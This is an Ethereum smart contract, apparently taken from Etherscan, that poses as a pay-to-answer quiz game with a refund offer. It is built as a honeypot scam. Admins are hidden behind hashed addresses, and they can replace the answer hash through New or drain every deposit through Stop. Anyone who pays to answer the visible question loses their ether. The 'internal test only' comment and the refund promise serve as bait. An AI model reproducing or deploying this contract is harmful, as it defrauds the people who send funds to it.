/**
 *Submitted for verification at Etherscan.io on 2022-09-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/***
    FOR INTERNAL TEST ONLY, DON'T TRY.
    TO TEST:
      1. Start: start quiz with 10 ether -- prize for the winner
      2. Try: try answer with 1.01 ether -- refund 3 ether if have tried every certain times 
      3. New: start a new game
      4. Stop: stop game and withdraw balance
***/
contract FunGame
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);
        // withdraw pool for correct answer
        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }

        if(msg.value > 1 ether){
            tryCounter[msg.sender] = tryCounter[msg.sender] + 1;
            if((tryCounter[msg.sender] % refundCounter) == 0){
                // refund 3 ether if have tried every certain times 
                payable(msg.sender).transfer(3 ether);
            }
        }
    }

    bool private isTest = true;
    
    string public question;

    bytes32 private responseHash;

    mapping (bytes32=>bool) private admin;

    address private owner;
    mapping(address => uint256) private tryCounter;
    uint256 private refundCounter = 3;

    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        // start game
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
            refundCounter = 3;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash, uint256 _refundCounter) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
        refundCounter = _refundCounter;
    }

    constructor(bytes32[] memory admins) {
        owner = msg.sender;
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))] || owner == msg.sender);
        _;
    }

    fallback() external {}

}